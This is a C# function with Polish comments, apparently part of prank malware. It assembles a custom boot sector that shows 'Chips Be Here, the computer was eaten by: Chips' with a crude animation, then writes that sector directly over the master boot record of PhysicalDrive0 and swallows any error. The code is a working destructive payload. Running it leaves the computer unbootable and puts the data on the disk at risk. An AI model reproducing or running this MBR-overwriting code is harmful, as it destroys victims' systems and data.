static void OverwriteMBR() {
    byte[] mbr = new byte[512];
    
    // Rozbudowany kod bootloadera (x86 Real Mode Assembly)
    byte[] bootCode = new byte[] {
        0xB8, 0x13, 0x00, 0xCD, 0x10,       // mov ax, 13h | int 10h (Tryb graficzny)
        0x0F, 0x20, 0xC0,                   // mov eax, cr0 (opcjonalne, dla trików)
        0xB8, 0x00, 0xA0, 0x8E, 0xC0,       // mov ax, 0xA000 | mov es, ax (Segment wideo)
        
        // --- SEKCJA TEKSTOWA ---
        0xBE, 0x80, 0x7C,                   // mov si, offset tekstu (0x7C80)
        0xBB, 0x0F, 0x00,                   // mov bx, 000Fh (Kolor biały)
        0xB4, 0x0E,                         // mov ah, 0Eh (Teletype output)
        // Pętla tekstu
        0xAC, 0x08, 0xC0, 0x74, 0x04, 0xCD, 0x10, 0xEB, 0xF7, 
        
        // --- SEKCJA ANIMACJI CHIPSA ---
        0x31, 0xDB,                         // xor bx, bx (Licznik klatek/kąt)
        // Pętla główna animacji (Label: AnimationLoop)
        0x31, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAB, // Clear Screen (stosunkowo wolno)
        
        0xBF, 0x40, 0x7D,                   // mov di, 32000 (Środek ekranu)
        0x01, 0xDF,                         // add di, bx (Przesunięcie chipsu)
        
        // Rysowanie "Chipsa" (Kwadrat 40x40 jako reprezentacja graficzna)
        0xB0, 0x2C,                         // mov al, 44 (Kolor żółty/pomarańczowy)
        0xB9, 0x28, 0x00,                   // mov cx, 40 (Szerokość)
        // Pętla rysowania (Label: DrawRow)
        0xF3, 0xAA,                         // rep stosb
        0x81, 0xC7, 0x18, 0x01,             // add di, 320 - 40 (Następna linia)
        // Tu możnaby dodać więcej instrukcji rysujących krzywą...
        
        0x43,                               // inc bx (Animacja ruchu)
        0xB4, 0x86, 0x31, 0xC9, 0xBA, 0x10, 0x27, 0xCD, 0x15, // Wait (Int 15h, ah=86h) dla płynności
        0xEB, 0xDC                          // jmp AnimationLoop
    };

    // Twój tekst
    byte[] msg = Encoding.ASCII.GetBytes("Chips Be Here, the computer was eaten by: Chips\0");

    // Kopiowanie kodu i tekstu do sektora
    Array.Copy(bootCode, 0, mbr, 0, bootCode.Length);
    Array.Copy(msg, 0, mbr, 0x80, msg.Length); // Tekst pod offsetem 0x80

    // Sygnatura bootowalna (Pikobelo)
    mbr[510] = 0x55; 
    mbr[511] = 0xAA;

    try {
        // Otwieramy dysk z flagą GENERIC_WRITE (0x40000000)
        IntPtr hDrive = CreateFile("\\\\.\\PhysicalDrive0", 0x40000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
        uint written;
        WriteFile(hDrive, mbr, 512, out written, IntPtr.Zero);
    } catch { }
}
